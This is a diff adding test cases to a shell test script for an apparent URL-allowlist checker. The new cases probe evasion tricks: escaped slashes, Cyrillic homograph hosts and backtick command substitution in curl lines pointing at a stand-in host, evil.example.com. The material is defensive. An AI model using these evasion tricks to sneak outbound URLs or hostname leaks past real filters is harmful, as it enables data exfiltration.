@@ -166,6 +166,21 @@ check "loopback lookalike is not treated as loopback" block "$sample_dir/y.md" \
 check "documentation host is not allowed in code" block "$sample_dir/y2.rs" \
   'const U: &str = "https://keepachangelog.com/";'
 
+check "escaped slashes do not hide a URL" block "$sample_dir/y0.json" \
+  '{"u": "https:\\/\\/evil.example.com/x"}'
+
+check "non-ASCII host is reported, not silently unmatched" block "$sample_dir/y3.rs" \
+  'const U: &str = "https://\xd0\xb5vil.example.com/x";'
+
+check "homograph label cannot satisfy the snapshot pattern" block "$sample_dir/y4.rs" \
+  'const U: &str = "https://solana-snapshot-\xd0\xb0ms.erpc.global/x";'
+
+check "a backtick host has no literal to check" allow "$sample_dir/y5.sh" \
+  'curl https://\x60hostname\x60.evil.com/x'
+
+check "a backtick after a literal prefix is still checked" block "$sample_dir/y6.sh" \
+  'curl https://evil.example.com\x60x\x60/y'
+
 # --- must allow -------------------------------------------------------------
 
 check "allowlisted service host" allow "$sample_dir/g.rs" \
